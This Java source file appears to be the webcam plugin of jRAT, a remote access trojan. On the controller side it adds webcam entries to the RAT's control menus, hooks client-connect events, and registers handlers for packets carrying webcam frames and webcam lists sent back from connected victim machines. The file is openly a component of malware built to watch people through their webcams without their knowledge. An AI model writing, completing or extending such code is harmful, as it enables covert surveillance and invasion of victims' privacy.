package jrat.plugin.webcam.client;

import iconlib.IconUtils;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import jrat.api.Client;
import jrat.api.Plugin;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnEnableEvent;
import jrat.api.net.Packet;
import jrat.api.net.Reader;
import jrat.api.ui.RATControlMenuEntry;
import jrat.api.ui.RATMenuItem;

public class WebcamPlugin extends Plugin {

	public static final short HEADER_WEBCAM_FRAME = 120;
	public static final short HEADER_LIST_WEBCAMS = 121;

	public static RATControlMenuEntry entry;
	public static boolean enabled;
	
	public static Map<Client, List<String>> map = new HashMap<Client, List<String>>();

	public WebcamPlugin() {
		super("Webcam", "1.3.1", "Webcam Plugin", "jRAT", IconUtils.getIcon("icon", WebcamPlugin.class));
		
		entry = new RATControlMenuEntry("Webcam", IconUtils.getIcon("icon", WebcamPlugin.class), PanelWebcam.class);
		RATControlMenuEntry.addEntry(entry);
		
		RATMenuItem item = new RATMenuItem(new MenuListener(), "Webcam", IconUtils.getIcon("icon", WebcamPlugin.class));
		RATMenuItem.addItem(item);
		
		Event.getHandler().register(EventType.EVENT_CLIENT_CONNECT, new ConnectHandler());
		
		Packet.registerIncoming(HEADER_LIST_WEBCAMS, new Packet121ListWebcams());
		Packet.registerIncoming(HEADER_WEBCAM_FRAME, new Packet120Webcam());
	}

	public void onEnable(OnEnableEvent event) throws Exception {
		try {
			Properties prop = new Properties();
			prop.load(new FileInputStream(System.getProperty("jrat.dir") + File.separator + "files/plugins/Webcam/config.properties"));

			PanelWebcam.WIDTH = Integer.parseInt(prop.getProperty("width"));
			PanelWebcam.HEIGHT = Integer.parseInt(prop.getProperty("height"));
		} catch (FileNotFoundException ex) {
			
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static String readString(Reader dataReader) throws Exception {
		short len = dataReader.readShort();
		StringBuffer buffer = new StringBuffer();
		for (short s = 0; s < len; s++) {
			buffer.append(dataReader.readChar());
		}
		
		return buffer.toString();
	}
}
